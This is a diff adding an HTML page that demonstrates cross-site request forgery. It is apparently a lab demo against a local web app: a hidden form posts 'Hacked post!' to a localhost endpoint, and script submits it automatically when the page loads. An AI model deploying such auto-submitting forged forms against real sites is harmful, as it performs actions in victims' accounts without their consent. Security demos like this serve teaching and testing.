@@ -1,0 +1,6 @@
+<form action="http://127.0.0.1:5000/posts" method="post" id="evil-form">
+  <input type="text" name="message" value="Hacked post!">
+</form>
+<script>
+  document.getElementById('evil-form').submit();
+</script>
